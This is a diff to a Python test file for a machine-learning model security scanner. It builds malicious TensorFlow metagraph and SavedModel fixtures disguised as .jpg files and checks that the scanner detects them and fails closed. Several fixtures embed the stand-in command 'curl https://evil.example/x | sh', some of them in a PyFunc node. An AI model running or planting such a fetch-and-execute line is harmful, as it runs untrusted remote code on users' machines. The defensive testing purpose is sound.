@@ -167,21 +167,6 @@ def _build_malicious_tf_metagraph() -> bytes:
     return cast(bytes, metagraph.SerializeToString())
 
 
-def _build_function_only_malicious_tf_metagraph() -> bytes:
-    _require_tf_protos()
-    import modelaudit.protos  # noqa: F401
-
-    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
-    metagraph = meta_graph_pb2.MetaGraphDef()
-    function = metagraph.graph_def.library.function.add()
-    function.signature.name = "malicious_function"
-    node = function.node_def.add()
-    node.name = "function_pyfunc_node"
-    node.op = "PyFunc"
-    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
-    return cast(bytes, metagraph.SerializeToString())
-
-
 def _build_malicious_tf_savedmodel() -> bytes:
     _require_tf_protos()
     import modelaudit.protos  # noqa: F401
@@ -196,7 +181,11 @@ def _build_malicious_tf_savedmodel() -> bytes:
     return cast(bytes, saved_model.SerializeToString())
 
 
-def _build_collection_only_tf_savedmodel() -> bytes:
+def _build_collection_only_tf_savedmodel(
+    *,
+    key: str = "runtime_hook",
+    value: bytes = b"curl https://evil.example/x | sh",
+) -> bytes:
     _require_tf_protos()
     import modelaudit.protos  # noqa: F401
 
@@ -204,8 +193,23 @@ def _build_collection_only_tf_savedmodel() -> bytes:
     saved_model = saved_model_pb2.SavedModel()
     saved_model.saved_model_schema_version = 1
     metagraph = saved_model.meta_graphs.add()
-    metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
+    metagraph.collection_def[key].bytes_list.value.append(value)
     return cast(bytes, saved_model.SerializeToString())
+
+
+def _build_malicious_tf_function_metagraph() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    function = metagraph.graph_def.library.function.add()
+    function.signature.name = "danger"
+    node = function.node_def.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
+    return cast(bytes, metagraph.SerializeToString())
 
 
 def _build_malicious_skops_schema() -> bytes:
@@ -4502,20 +4506,15 @@ def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: P
     )
 
 
-def test_scan_file_detects_function_only_malicious_renamed_tf_metagraph_by_content(tmp_path: Path) -> None:
-    disguised_metagraph = tmp_path / "function-only.jpg"
-    disguised_metagraph.write_bytes(_build_function_only_malicious_tf_metagraph())
+def test_scan_file_detects_malicious_renamed_tf_function_metagraph_by_content(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "function-malicious.jpg"
+    disguised_metagraph.write_bytes(_build_malicious_tf_function_metagraph())
 
     result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
 
     assert result.scanner_name == "tf_metagraph"
     assert result.success is False
-    assert any(
-        issue.severity == IssueSeverity.CRITICAL
-        and issue.message == "Dangerous TensorFlow operation: PyFunc"
-        and issue.details.get("op_type") == "PyFunc"
-        for issue in result.issues
-    )
+    assert any(issue.details.get("op_type") == "PyFunc" for issue in result.issues)
 
 
 def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
@@ -4556,6 +4555,74 @@ def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: 
     assert any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)
 
 
+def test_scan_file_does_not_flag_benign_renamed_tf_savedmodel_collection_metadata(tmp_path: Path) -> None:
+    disguised_savedmodel = tmp_path / "benign-collection.jpg"
+    disguised_savedmodel.write_bytes(
+        _build_collection_only_tf_savedmodel(value=b"documentation: https://example.invalid/runtime")
+    )
+
+    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_savedmodel"
+    assert not any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)
+
+
+def test_scan_file_fails_closed_for_oversized_renamed_tf_savedmodel_without_caching(tmp_path: Path) -> None:
+    disguised_savedmodel = tmp_path / "saved-large.jpg"
+    seed = _build_malicious_tf_savedmodel()
+    disguised_savedmodel.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
+    cache_dir = tmp_path / "cache"
+    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(disguised_savedmodel), config=config)
+        second = scan_file(str(disguised_savedmodel), config=config)
+
+        assert first.scanner_name == "tf_savedmodel"
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["operational_error_reason"] == "savedmodel_parse_budget_exceeded"
+        assert any("SavedModel exceeds bounded parse budget" in issue.message for issue in first.issues)
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+def test_scan_file_fails_closed_for_incomplete_tf_protobuf_routing_without_caching(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
+    ambiguous_payload = tmp_path / "ambiguous-routing.jpg"
+    ambiguous_payload.write_bytes(b"\x08\x01" + (b"\x18\x00" * 4))
+    cache_dir = tmp_path / "cache"
+    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}
+
+    reset_cache_manager()
+    try:
+        first = scan_file(str(ambiguous_payload), config=config)
+        second = scan_file(str(ambiguous_payload), config=config)
+
+        assert first.scanner_name == "unknown"
+        assert first.success is False
+        assert second.success is False
+        assert first.metadata["scan_outcome"] == "inconclusive"
+        assert first.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
+        assert "tensorflow_protobuf_routing_incomplete" in first.metadata["scan_outcome_reasons"]
+        check = next(check for check in first.checks if check.name == "TensorFlow Protobuf Routing")
+        assert "bounded structural probe reached its limit" in check.message
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(ambiguous_payload), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
 def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp_path: Path) -> None:
     disguised_metagraph = tmp_path / "oversized.jpg"
     seed = _build_malicious_tf_metagraph()
@@ -4585,22 +4652,6 @@ def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp
     assert core_module.determine_exit_code(aggregate) == 2
 
 
-def test_scan_file_routes_oversized_renamed_tf_savedmodel_to_fail_closed_scan(tmp_path: Path) -> None:
-    disguised_savedmodel = tmp_path / "oversized-savedmodel.jpg"
-    seed = _build_malicious_tf_savedmodel()
-    disguised_savedmodel.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
-
-    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
-
-    assert result.scanner_name == "tf_savedmodel"
-    assert result.success is False
-    assert result.metadata["operational_error_reason"] == "savedmodel_parse_budget_exceeded"
-    assert any("SavedModel exceeds bounded parse budget" in issue.message for issue in result.issues)
-
-    aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
-    assert core_module.determine_exit_code(aggregate) == 2
-
-
 def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp_path: Path) -> None:
     malformed_payload = tmp_path / "malformed-large.jpg"
     malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))
@@ -4615,8 +4666,8 @@ def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp
 
 
 def test_scan_file_routes_large_field_two_protobuf_to_fail_closed_tensorflow_scan(tmp_path: Path) -> None:
-    generic_payload = tmp_path / "generic-large.jpg"
-    generic_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * (_MAX_PARSE_BYTES + 1)))
+    generic_payload = tmp_path / "candidate-large.jpg"
+    generic_payload.write_bytes(b"\x0a\x03\x0a\x01x" + b"\x12\x81\x80\x80\x0a" + (b"x" * (_MAX_PARSE_BYTES + 1)))
 
     result = scan_file(str(generic_payload), config={"cache_enabled": False})
     aggregate = scan_model_directory_or_file(str(generic_payload), cache_enabled=False)
